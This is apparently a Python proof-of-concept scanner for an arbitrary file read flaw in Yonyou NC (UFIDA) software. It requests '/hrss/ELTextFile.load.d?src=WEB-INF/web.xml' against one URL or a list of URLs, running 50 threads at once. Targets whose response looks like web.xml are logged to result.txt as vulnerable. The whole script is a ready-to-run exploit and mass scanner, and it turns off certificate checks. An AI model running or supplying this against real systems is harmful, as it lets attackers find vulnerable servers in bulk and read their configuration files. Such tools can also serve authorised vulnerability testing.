#用友NC UFIDA ELTextFile.load.d任意文件读取
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

#定义横幅
def banner():
    banner = """

███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
█████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║
██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝                      
                                    version:YongyouNC_ufida_eltextfile_FileRead
                                    Author: Laow🚦
                                                
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="用友NC UFIDA ELTextFile.load.d任意文件读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    # ses = requests.Session()
    payload = "/hrss/ELTextFile.load.d?src=WEB-INF/web.xml"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
        "Accept-Encoding": "gzip, deflate", 
        "Connection": "close"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    
    try:
        re = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=5)
        if re.status_code == 200 and 'xml' in re.text and 'version' in re.text:
            print(f'{GREEN}[+] {url} 存在任意文件读取漏洞！{RESET}')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print('不存在该漏洞!!')
    except:
        pass


if __name__ == '__main__':
    main()
